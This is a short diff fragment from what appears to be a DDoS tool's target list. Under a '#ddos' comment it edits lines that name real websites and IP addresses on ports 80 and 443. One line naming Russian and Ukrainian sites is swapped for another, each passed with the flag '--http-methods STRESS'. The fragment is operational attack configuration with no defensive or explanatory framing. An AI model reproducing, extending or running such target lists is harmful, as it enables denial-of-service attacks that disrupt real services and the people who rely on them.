@@ -34,7 +34,7 @@ https://sd.boxberry.ru tcp://188.130.235.86:80 tcp://188.130.235.86:443 tcp://13
 #ddos separiv
 
 
-http://online.metro-cc.ru http://www.asna.ru/ --http-methods STRESS 
+http://www.asna.ru/ http://kiev.wikimapia.org/streets/page/2 --http-methods STRESS 
 
 tcp://185.169.155.178:80 tcp://185.169.155.178:443 tcp://5.200.62.190:80 tcp://5.200.62.190:443
 
